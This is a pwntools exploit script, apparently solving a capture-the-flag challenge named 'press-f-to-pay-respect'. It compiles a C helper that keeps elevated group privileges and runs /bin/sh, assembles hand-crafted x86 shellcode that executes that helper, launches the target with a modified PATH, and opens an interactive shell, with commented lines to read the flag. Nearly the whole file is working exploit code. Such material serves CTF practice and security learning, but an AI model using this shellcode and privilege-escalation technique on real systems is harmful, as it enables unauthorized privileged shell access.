from pwn import *
import os

DEBUG = False 
file = "./press-f-to-pay-respect"

c_code = """
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
    return 0;
}
"""

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

shellcode = asm('''
nop
push 0xf
pop eax
push 0xf
xor eax, 0xf
push eax 
push eax
emms
pop ecx
emms
pop edx
emms
push   0xf
push   0x7a
emms
cmp    al, 0xf
mov    ebx,esp
emms
cmp    al, 0xf
push   0xb
emms 
pop eax
emms
cmp    al, 0xf
int    0x80
''')

print(disasm(shellcode))

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)

env = {"PATH":"$PATH:."}

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug_shellcode(shellcode, gdbscript='''
''')
else:
    io = process(file, env=env)
io.interactive()

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
